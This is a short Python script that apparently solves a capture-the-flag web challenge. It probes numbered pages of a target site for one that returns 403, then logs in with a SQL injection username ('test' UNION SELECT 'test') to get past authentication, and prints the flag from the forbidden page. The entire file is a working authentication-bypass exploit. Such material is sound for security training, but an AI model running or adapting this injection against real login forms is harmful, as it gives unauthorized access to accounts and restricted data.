import sys
import requests
import re

session = requests.Session()

# Find forbidden page
forbidden_page = -1
max_pages = 20
for i in range(1, max_pages + 1):
    r = session.get(sys.argv[1] + '/page/' + str(i))
    if r.status_code == 403:
        forbidden_page = i
        break

# Login
attack = "test' UNION SELECT 'test"
session.post(sys.argv[1] + '/login', data={'username': attack, 'password': 'test'})

if forbidden_page == -1:
    print("Unable to find forbidden page")
else:
    r = session.get(sys.argv[1] + '/page/' + str(forbidden_page))
    print(re.search(r"\^FLAG\^\w*\$FLAG\$", r.text).group())